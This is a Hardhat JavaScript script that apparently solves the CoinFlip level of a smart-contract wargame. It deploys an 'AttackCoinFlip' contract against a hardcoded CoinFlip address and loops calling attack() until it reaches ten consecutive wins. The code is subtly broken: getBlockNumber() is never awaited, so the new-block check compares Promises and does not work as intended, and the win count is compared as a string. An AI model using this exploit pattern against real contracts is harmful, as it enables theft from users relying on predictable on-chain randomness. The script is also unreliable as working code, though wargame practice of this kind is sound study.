const { Alchemy } = require("alchemy-sdk");
const hre = require("hardhat");

async function main() {
  const COINFLIP_ADDRESS = "0x66BD1DAFc0a8ea1E909128a374b98EAbE1B7066e";
  const alchemy = new Alchemy();
  let latestBlockNumber;

  const ContractFactory = await hre.ethers.getContractFactory("AttackCoinFlip");
  const contract = await ContractFactory.deploy(
    await hre.ethers.utils.getAddress(COINFLIP_ADDRESS)
  );

  await contract.deployed();

  const coinFlip = await (
    await ethers.getContractFactory("CoinFlip")
  ).attach(COINFLIP_ADDRESS);

  const timer = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

  let wins = (await coinFlip.consecutiveWins()).toString();
  console.log("wins: ", wins);

  (async () => {
    while (wins < 10) {
      const blockNumber = alchemy.core.getBlockNumber();
      if (!latestBlockNumber) {
        latestBlockNumber = blockNumber;
      }

      if (blockNumber !== latestBlockNumber) {
        console.log("blockNuber: ", await blockNumber);
        await contract.attack();
        wins = (await coinFlip.consecutiveWins()).toString();
        console.log("successfully attacked");
        console.log("wins: ", await wins);
      }
      await timer(2000);
    }
  })();
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
